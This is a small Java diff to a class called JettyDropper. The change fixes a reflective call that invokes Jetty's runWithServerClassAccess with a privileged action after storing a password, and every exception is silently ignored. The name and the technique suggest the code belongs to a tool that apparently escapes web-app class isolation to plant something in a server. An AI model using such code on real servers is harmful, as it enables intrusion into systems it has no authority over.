@@ -25,7 +25,7 @@ public class JettyDropper implements PrivilegedExceptionAction<Void> {
         JettyDropper.password = password;
         try {
             // seems like there should be a better way...
-            Thread.currentThread().getContextClassLoader().getClass().getMethod("runWithServerClassAccess", java.security.PrivilegedExceptionAction.class).invoke(new JettyDropper());
+            Thread.currentThread().getContextClassLoader().getClass().getMethod("runWithServerClassAccess", java.security.PrivilegedExceptionAction.class).invoke(null, new JettyDropper());
         } catch (Exception ignored) {
         }
     }
